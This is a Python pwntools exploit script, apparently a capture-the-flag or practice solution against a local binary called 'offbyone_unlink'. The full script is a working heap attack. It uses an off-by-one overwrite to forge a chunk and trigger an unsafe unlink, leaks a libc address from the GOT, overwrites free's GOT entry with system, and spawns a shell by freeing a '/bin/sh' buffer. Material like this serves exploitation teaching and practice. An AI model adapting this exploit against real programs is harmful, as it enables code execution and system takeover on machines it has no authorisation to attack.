#!/usr/bin/env python2
# coding = utf-8
# Environment: Ubuntu 16.04

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice):
    p.recvuntil('>')
    p.sendline(str(choice))

def new_data(size, data):
    send_choice(1)
    p.recvuntil('size ?')
    p.sendline(str(size))
    p.recvuntil('data:')
    p.send(data)

def delete_data(index):
    send_choice(2)
    p.recvuntil('index?')
    p.sendline(str(index))

def show_data(index):
    send_choice(3)
    p.recvuntil('index?')
    p.sendline(str(index))

def edit_data(index, data):
    send_choice(4)
    p.recvuntil('index?')
    p.sendline(str(index))
    p.recvuntil('data?')
    p.send(data)

p = process('./offbyone_unlink')
elf = ELF('./offbyone_unlink')
gdb.attach(p, '')

"""
Heap Layout:
|--------------------
|(nested a fake)chunk used to do off-by-one
|--------------------
|unsorted bin chunk(to unlink)
|--------------------
|isolating chunk(from top)
|--------------------
|top chunk(lefted)
|--------------------
SmallBin: 0x80 < size < 0x400
"""

data_bss = 0x602120     # Directly point to a chunk(i: 0) which will be forged to free later
new_data(0x108, 'a')    # chunk(i: 0): 0x100 user data block + 0x8 nextchunk.prev_size(used for data)
new_data(0xf0, 'a')
new_data(0x100, '/bin/sh\x00')

# Step 1: Do heap unlink to get arbitrary memory R/W
payload = ''            # A Nested Fake Chunk(fake_chunk) to trigger heap unlink
payload += p64(0)       # fake_chunk->prev_size
payload += p64(0x100 | 0x001)   # fake_chunk->size | PREV_INUSE
payload += p64(data_bss - 0x18) # fake_chunk->fd
payload += p64(data_bss - 0x10) # fake_chunk->bk
payload = payload.ljust(0x100, 'a') # Padding fake_chunk to user data block size(0x100)
payload += p64(0x100)   # next_chunk(i:1)->prev_size
payload += p8(0)        # (off-by-one byte) next_chunk->PREV_INUSE = false (forged free)
edit_data(0, payload)
delete_data(1)

# Step 2: Leak `printf` libc address
printf_got = elf.got['printf']
payload = '0' * 0x18 + p64(data_bss) + p64(printf_got)
edit_data(0, payload)
show_data(1)
printf_libc = u64(p.recv(6) + '\x00\x00')
libc = LibcSearcher('printf', printf_libc)
libc_base = printf_libc - libc.dump('printf')
system_libc = libc_base + libc.dump('system')

# Step 3: Write `free` GOT with `system` and get shell
free_got = elf.got['free']
payload = p64(data_bss) + p64(free_got)
edit_data(0, payload)
edit_data(1, p64(system_libc))
delete_data(2)

p.interactive()